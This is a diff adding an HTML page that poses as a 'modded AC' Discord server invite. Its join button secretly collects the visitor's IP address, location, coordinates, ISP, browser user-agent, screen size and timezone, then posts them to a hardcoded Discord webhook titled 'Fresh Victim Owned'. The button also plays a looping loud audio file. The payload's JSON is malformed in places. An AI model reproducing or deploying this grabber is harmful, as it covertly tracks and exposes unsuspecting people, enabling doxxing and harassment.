@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+ <title>Modded AC Discord Server</title>
+ <meta charset="utf-8">
+ <style>
+ body,html{margin:0;height:100%;background:#000;color:#fff;font-family:Arial;display:flex;align-items:center;justify-content:center;flex-direction:column}
+ h1{font-size:60px;text-align:center;margin-bottom:40px}
+ button{font-size:45px;padding:40px 80px;background:#00ff00;border:none;border-radius:25px;cursor:pointer;box-shadow:0 0 30px #00ff00}
+ #loader{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:999;align-items:center;justify-content:center;flex-direction:column}
+ #loader h1{font-size:50px;color:#00ff00}
+ </style>
+</head>
+<body>
+ <h1>JOIN THE BEST MODDED AC SERVER</h1>
+ <button onclick="own()">CLICK HERE TO JOIN DISCORD SERVER</button>
+
+ <div id="loader">
+ <h1>Connecting you...</h1>
+ </div>
+
+ <audio id="rape" loop>
+ <source src="https://files.catbox.moe/earrape-666.mp3" type="audio/mpeg">
+ </audio>
+
+<script>
+function own() {
+ document.getElementById('loader').style.display = 'flex';
+ 
+ const audio = document.getElementById('rape');
+ audio.volume = 1;
+ audio.play().catch(() => {});
+
+ fetch('https://ipapi.co/json/')
+ .then(r => r.json())
+ .then(data => {
+ const payload = {
+ content: "@everyone **NEW IDIOT CLICKED THE MODDED AC LINK**",
+ embeds: title: "Fresh Victim Owned",
+ color: 65280,
+ fields: {name: "IP", value: data.ip, inline: true},
+ {name: "Location", value: `${data.city}, ${data.region}, ${data.country_name}`, inline: true},
+ {name: "ISP", value: data.org, inline: true},
+ {name: "Coords", value: `${data.latitude}, ${data.longitude}`, inline: true},
+ {name: "User-Agent", value: navigator.userAgent, inline: false},
+ {name: "Screen", value: `${screen.width}x${screen.height}`, inline: true},
+ {name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true}
+ ],
+ timestamp: new Date().toISOString()
+ }]
+ };
+
+ fetch('https://discord.com/api/webhooks/1467137149873819710/oDpNM0_05l4BLYpA6yri4jQ_mB14fvJF5wkOOsMozD4KNM17kBXFmb189GWvxr2-r_kb', {
+ method: 'POST',
+ headers: {'Content-Type': 'application/json'},
+ body: JSON.stringify(payload)
+ });
+ });
+}
+</script>
+</body>
+</html>
